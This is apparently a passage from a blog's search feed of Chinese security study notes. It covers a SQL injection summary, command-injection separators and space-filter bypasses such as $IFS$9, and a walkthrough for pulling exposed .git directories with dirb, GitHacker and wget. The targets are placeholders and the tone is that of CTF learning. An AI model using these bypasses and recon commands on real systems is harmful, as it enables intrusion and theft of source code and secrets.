title="​总结​"></a>​总结​</h4><ul><li><p>​<code>UNION</code>列值必须为单值​：子查询、函数、字面量均可，但 ​不能是独立查询语句。</p></li><li><p>​<strong>SQL 注入中的高频错误</strong>​：</p><ol><li><p>混淆子查询与独立查询；</p></li><li><p>未封装聚合函数（如 <code>GROUP_CONCAT()</code>必须搭配子查询）。</p></li></ol></li><li><p>​<strong>调试技巧</strong>​：在靶场中开启数据库错误日志，观察具体语法错误提示。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞</title>
      <link href="/2025/09/rce/"/>
      <url>/2025/09/rce/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="命令执行原理"><a href="#命令执行原理" class="headerlink" title="命令执行原理"></a>命令执行原理</h3><p><strong>调用函数执行命令未做过滤，注入恶意命令</strong></p><h2 id="执行基础"><a href="#执行基础" class="headerlink" title="执行基础"></a>执行基础</h2><h3 id="1-转义字符"><a href="#1-转义字符" class="headerlink" title="1.转义字符"></a>1.转义字符</h3><ul><li><p>windows：<code>^</code></p></li><li><p>Linux:<code>\</code></p></li></ul><h3 id="2-多条命令执行"><a href="#2-多条命令执行" class="headerlink" title="2.多条命令执行"></a>2.多条命令执行</h3><ul><li><p>Windows:<code>&amp;&amp; || %0a</code></p></li><li><p>linux:<code>&amp;&amp;   ||   ;   $()  %0a    %0d</code>，还有&#96;&#96;</p></li></ul><p>例如在Windows中执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noexist || echo helloworld #neoxist程序不存在,or执行后面的echo</span><br></pre></td></tr></table></figure><h3 id="3-注释符号"><a href="#3-注释符号" class="headerlink" title="3.注释符号"></a>3.注释符号</h3><ul><li><p>Windows: <code>::</code></p></li><li><p>Linux:<code>#</code></p></li></ul><h2 id="命令执行漏洞绕过"><a href="#命令执行漏洞绕过" class="headerlink" title="命令执行漏洞绕过"></a>命令执行漏洞绕过</h2><h3 id="1-空格过滤为空"><a href="#1-空格过滤为空" class="headerlink" title="1.空格过滤为空"></a>1.空格过滤为空</h3><p>i.利用不可见字符代替,例如一一尝试<code>%00~&amp;ff</code></p><p>ii.字符串截取获取空格</p><p>a.<strong>在Windows下</strong>:<code>%programfile:~10,1%</code>,~表示截取字符,获取programfie环境变量的值,并且从第十个获取一个字符串</p><p>b.<strong>在Linux下</strong>:<code>$IFS$9</code></p><h3 id="2-黑名单过滤"><a href="#2-黑名单过滤" class="headerlink" title="2.黑名单过滤"></a>2.黑名单过滤</h3>]]></content>
      
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>敏感信息泄露-git</title>
      <link href="/2025/09/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-git/"/>
      <url>/2025/09/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-git/</url>
      
        <content type="html"><![CDATA[<h1 id="敏感信息泄露–git-1"><a href="#敏感信息泄露–git-1" class="headerlink" title="敏感信息泄露–git(1)"></a>敏感信息泄露–git(1)</h1><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><h3 id="目录扫描-确认git是否存在"><a href="#目录扫描-确认git是否存在" class="headerlink" title="目录扫描-确认git是否存在"></a>目录扫描-确认git是否存在</h3><h4 id="dirsearch工具"><a href="#dirsearch工具" class="headerlink" title="dirsearch工具"></a>dirsearch工具</h4><p>示例:<code>python dirsearch.py -u &lt;目标URL&gt; -e &lt;扩展名&gt;</code>,如果存在访问 <code>http://target.com/.git/HEAD</code>，返回 <code>ref: refs/heads/master</code>或类似内容，则证实泄露存在。</p><h4 id="dirb工具"><a href="#dirb工具" class="headerlink" title="dirb工具"></a>dirb工具</h4><p>1.虽然 <code>.git</code>是目录，但有时可以尝试扫描可能存在的 <code>.git/</code>目录下的特定文件，如 <code>HEAD</code>、<code>config</code>。</p><p><code>dirb http://target.com -X .git</code></p><p>2.<code>.git</code>是一个目录，其内部还有子目录和文件。使用 <code>-r</code>参数可以让 Dirb 对发现的目录进行递归扫描，从而更深入地发现 <code>.git</code>目录内部的结构</p><p><code>dirb http://target.com /path/to/your/git_wordlist.txt -r</code></p><p>3.如果目标站点需要登录才能访问某些路径，你可以使用获取到的 Cookie 进行认证扫描</p><p><code>dirb http://target.com -c &quot;session_id=yoursessioncookievalue&quot;</code></p><p>4.一个结合了自定义字典和递归扫描的命令示例如下：</p><p><code>dirb http://target.com /path/to/SecLists/Discovery/Web-Content/git.txt -r -o scan_output.txt</code></p><h4 id="SecLists​工具"><a href="#SecLists​工具" class="headerlink" title="SecLists​工具"></a><strong>SecLists</strong>​工具</h4><p>下载 SecLists（如果尚未安装）</p><p><code>git clone https://github.com/danielmiessler/SecLists.git</code></p><p>使用 SecLists 中针对 Git 的字典进行扫描</p><p><code>dirb http://target.com /path/to/SecLists/Discovery/Web-Content/git.txt</code></p><h3 id="常见利用手段"><a href="#常见利用手段" class="headerlink" title="常见利用手段"></a>常见利用手段</h3><p>1.<strong>常规泄露</strong>：使用工具scrabble在其目录下<code>./scrabble http://example.com/</code>将git输出到对应的目录</p><p>2.<strong>git回滚</strong>：经过常规泄露步骤后执行<code>git reset --hard HEAD^</code>跳跃到上一个版本</p><p>                    或者利用<code>git log -stat</code>查看哪些文件收到了修改,再用<code>git diff HEAD commit-id</code>查看当前版本和提交之间的区别</p><p>3.<strong>git分支</strong>：一条时间线是一个分支,主干分支默认<code>master</code>,如果flag藏在其他的分支里需要用到githacker,执行<code>python Githacker.py http://example.com/.git.</code>后查看本地生成的文件夹,执行<code>git log --all</code>或者<code>git branch -v</code>命令只能看到master的信息,此时执行<code>git reflog</code>查看checkout的记录,假如多出一个<code>x</code>分支.</p><p>                    手动下载分支的<code>head</code>信息保存到<code>.git/refs/heads/x</code>中–执行命令<code>wget http://example.com/.git/refs/heads/x</code></p><h3 id="获取完整的-git目录"><a href="#获取完整的-git目录" class="headerlink" title="获取完整的.git目录"></a>获取完整的.git目录</h3><h4 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h4><p>使用工具（如 <code>GitHacker</code>、<code>dvcs-ripper</code>）或递归下载，将整个 <code>.git</code>目录拖取到本地</p><h4 id="wget递归下载-git"><a href="#wget递归下载-git" class="headerlink" title="wget递归下载.git"></a>wget递归下载.git</h4><p>使用 wget 递归下载 .git 目录示例</p><p><code>wget --recursive --no-parent --no-host-directories http://target.com/.git/</code></p><h3 id="识别分支"><a href="#识别分支" class="headerlink" title="识别分支"></a>识别分支</h3><p>1.查看 .git&#x2F;refs&#x2F;heads&#x2F; 下的所有文件，每个文件通常对应一个分支名</p><p><code>ls -la .git/refs/heads/</code></p><p>2.检查 <code>git reflog</code>记录，有时能发现曾经切换分支的痕迹，提示其他分支的存在</p><p><code>git reflog</code></p><h3 id="手动恢复特定分支"><a href="#手动恢复特定分支" class="headerlink" title="手动恢复特定分支"></a>手动恢复特定分支</h3><p>需要<strong>手动下载该分支的HEAD信息</strong>并放入本地 <code>.git/refs/heads/</code>目录下</p><p><code>手动下载 secret 分支的 HEAD 引用文件</code></p><p><code>wget http://target.com/.git/refs/heads/secret -O .git/refs/heads/secret</code></p><p>之后，你可以使用 <code>git checkout secret</code>来切换到这个分支，查看该分支上的代码和文件。有些工具（如 <code>GitHacker</code>）在获取分支引用后，可能需要重新运行或利用其功能来获取该分支对应的对象文件。</p><h3 id="Git泄露的常见利用方式与工具"><a href="#Git泄露的常见利用方式与工具" class="headerlink" title="Git泄露的常见利用方式与工具"></a>Git泄露的常见利用方式与工具</h3><table><thead><tr><th>​<strong>利用方式</strong>​</th><th>​<strong>说明</strong>​</th><th>​<strong>常用工具&#x2F;命令</strong>​</th></tr></thead><tbody><tr><td>​<strong>源码完全恢复</strong>​</td><td>获取完整项目源代码，进行白盒审计</td><td><code>GitHack</code><br><br>, <code>GitHacker</code><br><br>, <code>dvcs-ripper</code></td></tr><tr><td>​<strong>历史记录挖掘</strong>​</td><td>查看所有提交历史，寻找敏感信息泄露（如密码、密钥被提交后又“删除”）</td><td><code>git log -p``git diff &lt;commit-id&gt;</code></td></tr><tr><td>​<strong>暂存区(index)检查</strong>​</td><td>查看已被 <code>git add</code>但未提交的文件内容</td><td><code>git ls-files --stage``git show :&lt;filename&gt;</code></td></tr><tr><td>​<strong>贮藏区(stash)检查</strong>​</td><td>恢复开发者临时贮藏（<code>git stash</code>）的未提交工作内容</td><td><code>git stash list``git stash show -p &lt;stash@\{0\}&gt;</code></td></tr><tr><td>​<strong>分支探查</strong>​</td><td>如上文所述，检查所有分支内容</td><td><code>git branch -a</code>, <code>git checkout &lt;branch-name&gt;</code></td></tr></tbody></table><h3 id="附言"><a href="#附言" class="headerlink" title="附言"></a>附言</h3><table><thead><tr><th>文件夹名称</th><th>作用</th></tr></thead><tbody><tr><td>COMMIT_EDITMSG</td><td>保存最新的commit message，Git系统不会用到这个文件，只是给用户一个参考</td></tr><tr><td>config</td><td>GIt仓库的配置文件</td></tr><tr><td>description</td><td>仓库的描述信息，主要给gitweb等git托管系统使用</td></tr><tr><td>HEAD</td><td>包含一个分支（branch）的引用，通过这个文件Git可以得到下一次commit的parent</td></tr><tr><td>hooks</td><td>存放一些shell脚本，可以设置特定的git命令后触发相应的脚本；在搭建gitweb系统或其他git托管系统会用到</td></tr><tr><td>hook scriptindex</td><td>这个文件就是暂存区（stage），是一个二进制文件</td></tr><tr><td>info</td><td>包含仓库的一些信息</td></tr><tr><td>logs</td><td>保存所有更新的引用记录</td></tr><tr><td>objects</td><td>所有的Git对象都会存放在这个目录中，对象的SHA1哈希值的前两位是文件夹名称，后38位作为对象文件名</td></tr><tr><td>refs</td><td>这个目录一般包括三个子文件夹，heads、remotes和tags，heads中的文件标识了项目中的各个分支指向的当前commit</td></tr><tr><td>ORIG_HEAD</td><td>HEAD指针的前一个状态</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 敏感信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
